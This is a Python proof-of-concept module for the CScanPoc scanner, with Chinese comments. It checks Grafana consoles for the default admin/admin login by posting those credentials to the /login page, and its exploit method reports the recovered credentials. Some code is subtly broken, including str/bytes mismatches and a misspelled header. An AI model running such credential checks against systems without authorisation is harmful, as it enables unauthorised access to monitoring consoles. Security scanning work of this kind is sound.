# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'crack_grafana'  # 平台漏洞编号
    name = 'grafana 弱口令'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.MISCONFIGURATION  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        对grafana控制台进行弱口令检测。
    '''  # 漏洞描述
    ref = 'Unknown'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Grafana'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9e8de427-2882-44a5-857a-d64c8619f83c'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = '{target}/login'.format(target=self.target)
            header = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36',
                'ContentType': 'application/x-www-form-urlencoded; chartset=UTF-8',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'zh-CN,zh;q=0.8',
                'Connection': 'close'
            }
            data = {"user": "admin", "email": "", "password": "admin"}
            data = urllib.parse.urlencode(data)
            request = urllib.request.Request(
                url=url, data=data, headers=header)
            timeout = 5
            try:
                res = urllib.request.urlopen(request, timeout=timeout)
                if "Logged in" in res.read():
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
            except Exception as e:
                self.output.info('执行异常{}'.format(e))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            url = '{target}/login'.format(target=self.target)
            header = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36',
                'ContentType': 'application/x-www-form-urlencoded; chartset=UTF-8',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'zh-CN,zh;q=0.8',
                'Connection': 'close'
            }
            data = {"user": "admin", "email": "", "password": "admin"}
            data = urllib.parse.urlencode(data)
            request = urllib.request.Request(
                url=url, data=data, headers=header)
            timeout = 5
            try:
                res = urllib.request.urlopen(request, timeout=timeout)
                if "Logged in" in res.read():
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为admin 密码为admin'.format(
                        target=self.target, name=self.vuln.name))

            except Exception as e:
                self.output.info('执行异常{}'.format(e))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
